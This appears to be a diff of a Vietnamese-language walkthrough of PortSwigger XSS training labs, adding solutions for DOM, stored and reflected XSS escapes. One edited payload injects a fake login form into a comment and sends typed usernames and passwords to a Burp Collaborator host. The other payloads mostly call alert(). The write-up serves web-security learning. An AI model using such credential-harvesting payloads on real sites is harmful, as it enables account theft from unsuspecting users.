@@ -72,20 +72,19 @@ Vậy làm thế nào để lấy được tài khoản người dùng?
 Bây giờ chỉ còn cách tạo các thẻ html để tạo một form login giả trong chức năng bình luận
 payload như sau:
 ```
-<input required="" type="username" name="username">
+<input required="" type="text" name="username">
 <input required="" type="password" name="password">
-<script>document.location='http://pa3atd45zyl03tnxu6h7lw42ctik69.burpcollaborator.net/?'+document.getElementsByName("username")[0].value 'password='+document.getElementsByName("password")[0].value</script>
+<script>document.location='http://pa3atd45zyl03tnxu6h7lw42ctik69.burpcollaborator.net/?'+document.getElementsByName("username")[0].value+'&password='+document.getElementsByName("password")[0].value</script>
 ```
 Nhưng nhận được kết quả chưa có thông tin gì về username và password có thể do quá trình tạo `document.location` tính năng tự động điền chưa được thực hiện.
 ![image](https://user-images.githubusercontent.com/68894302/170563118-1459c91e-e626-4d26-8ed9-92baaf1a5e77.png)
 Dùng thuộc tính `onchange` vào trong thẻ input của password để quan sát sự thay đổi .
 ```
-<input required="" type="username" name="username">
+<input required="" type="text" name="username">
 <input required="" type="password" name="password" onchange="document.location='http://0421a7pdyngvuefhurnsavp12s8iw7.burpcollaborator.net/?user='+document.getElementsByName('username')[0].value+'pass='+document.getElementsByName('password')[0].value">
 ```
 Và chúng ta nhận được thông tin về username và password
 ![image](https://user-images.githubusercontent.com/68894302/170564092-867762cb-f694-4cd1-a3d0-8763dd067b5f.png)
-
 
 ---
 ## Lab: Exploiting XSS to perform CSRF
@@ -307,3 +306,95 @@ payload
 ```
 Dùng `'</script>` để escape `<script>` sau đó chuỗi đầu vào được phản ánh trong đoạn mã javascript
 ![image](https://user-images.githubusercontent.com/68894302/171054303-6ec39690-7926-4bd6-9892-b40523010af3.png)
+
+## Lab: Reflected DOM XSS
+Kết quả tìm kiếm sẽ được trả về dưới dạng json như sau nếu chúng ta tìm kiếm một chuỗi ngẫu nhiên không có trong đoạn văn bản
+![image](https://user-images.githubusercontent.com/68894302/171316739-e18fe8ea-c240-4fb8-8f7f-6b41346fa73d.png)
+
+Source code:`<script>search('search-results')</script>`
+
+Khi thêm một dấu nháy kép vào thì dấu gạch chéo ngược được tự động thêm vì nó hiểu đó là kí tự đặc biệt 
+![image](https://user-images.githubusercontent.com/68894302/171316963-7f2b574a-7673-49b9-b096-07c2efd49557.png)
+
+Trên dev tool của trình duyệt bật phần debug lên chúng ta thấy biến searchTerm được hiển thị bởi hàm `eval()` rất nguy hiểm nếu chúng ta có thể escape ra và chèn vào đó một câu lệnh thực thi javascript như kiểu `alert()`, `print()`
+![image](https://user-images.githubusercontent.com/68894302/171317768-5bdf115d-3d69-4227-854e-6b2e855442ad.png)
+`responseText` luôn có nội dung trong phần tìm kiếm được trả về kể cả trường hợp nội dung không match với văn bản. 
+Để escape ra khỏi dấu ngoặc kép thì chúng ta sẽ thêm một dấu gạch chéo ngược trước kí tự `"` như thế này `\"` khi đó nó sẽ tự động thêm 1 dấu `\` nữa và sau dấu `"` chúng ta đã escape ra khỏi giá trị `searchTerm`.
+![image](https://user-images.githubusercontent.com/68894302/171320273-c6bef5f5-bb2f-4a32-9b31-a4bfef27b25d.png)
+và cuối cùng là 2 dấu `//` chính là phần comment để loại bỏ các phần dư phía sau cho đúng syntax json
+
+---
+
+## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+>  This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
+
+Đây là thử thách xss dựa trên reflected nên giá trị sau khi search sẽ được lưu trực tiếp vào trong code
+![image](https://user-images.githubusercontent.com/68894302/171321357-5bde23a2-5ec1-4b0e-8606-7b8b9fa9a929.png)
+Các giá trị như `" ' < >` đều bị encode nếu đưa vào khay tìm kiếm. Chúng ta có thể bypass bằng cách thêm dấu `\` để lừa ứng dụng rằng phía sau nó là một kí tự đặc biệt, vì thế nó sẽ không bị encode nữa
+![image](https://user-images.githubusercontent.com/68894302/171322154-f9beaa80-73fd-43f8-b870-fffecd6289f9.png)
+
+---
+## Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+Stored XSS nên nó sẽ lưu phần comment vào trong cơ sở dữ liệu. Ở phần này chúng ta chỉ cần focus vào ô điền website của chúng ta nơi nó có thuộc tính `onclick`. `onclick` là một thuộc tính mà khi đúp chuột vào phần tử đó nó sẽ được kích hoạt
+Ví dụ `onclick="print()"` khi đúp chuột nó sẽ thực thi hàm `print()`. Còn đây là phần source code của form điền website
+``` html
+<body>
+    <a id="author" href="https://14.rs/?'" onclick="
+        var tracker={track(){}};
+        tracker.track('https://14.rs');
+    ">
+    </a>
+</body>
+```
+Sau khi điền tên website thì nó sẽ được đưa vào hàm onclick để thực thi, chúng ta có thẻ escape ra khỏi kí tự `'` và sau đó là một hàm `alert()`.
+
+```
+https://14.rs/?'+alert()+'
+```
+Theo dự tính thì nó sẽ như thế này
+```html
+<body>
+    <a id="author" href="https://14.rs/?'" onclick="
+        var tracker={track(){}};
+        tracker.track('https://14.rs/?'+alert()+'');
+    ">
+    </a>
+</body>
+```
+Nhưng khi đưa vào thì
+![image](https://user-images.githubusercontent.com/68894302/171366214-28d3e4ab-d6f5-4177-8d60-8cfea6719c1c.png)
+Như ta thấy giá trị `'` khi chúng ta thêm vào nó sẽ được thêm vào trước đó một dấu `\` vì có thể tác giả dùng replace hoặc do trình phân tích cú pháp url tự động. Vậy thì để bypass  chúng ta encoded nó sang dạng url như sau `'` -> `&#x27;` 
+payload 
+```
+https://14.rs/?&#x27;+alert()+&#x27;//
+```
+![image](https://user-images.githubusercontent.com/68894302/171367634-7b825cd1-0218-4550-963d-97c3bd0dcb30.png)
+
+---
+## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+Đây là một thử thách Reflected XSS nên chuỗi tìm kiếm sẽ được lưu trực tiếp vào trong code html. Ở bài này cũng bị mã hóa các kí tự như `' > < " /` và còn một số kí tự nữa sang dạng unicode 
+![image](https://user-images.githubusercontent.com/68894302/171451095-bd32f63e-d6c6-4dff-9a49-4530a1d3efe8.png)
+
+Tuy nhiên có một cách để thực thi JS rất dễ dàng đóa là nếu reflect bên trong template literals `` thì chúng ta có thể nhúng các biểu thực JS bằng cách dùng cú pháp ${...}. Ví dụ:
+
+![image](https://user-images.githubusercontent.com/68894302/171450512-a2d9ce13-861f-43f9-a106-390f484feb77.png)
+
+Áp dụng vào challenge chúng ta có payload:
+```
+${alert()}
+```
+
+![image](https://user-images.githubusercontent.com/68894302/171453144-e2a52684-e8fb-4f5e-ba16-6e29bd879f28.png)
+![image](https://user-images.githubusercontent.com/68894302/171452883-1154a2fd-74c5-44bf-a0b0-de42b379ec75.png)
+
+--- 
+
+## Lab: Reflected XSS in a JavaScript URL with some characters blocked
+Link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
+
+>  This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
+To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message. 
+
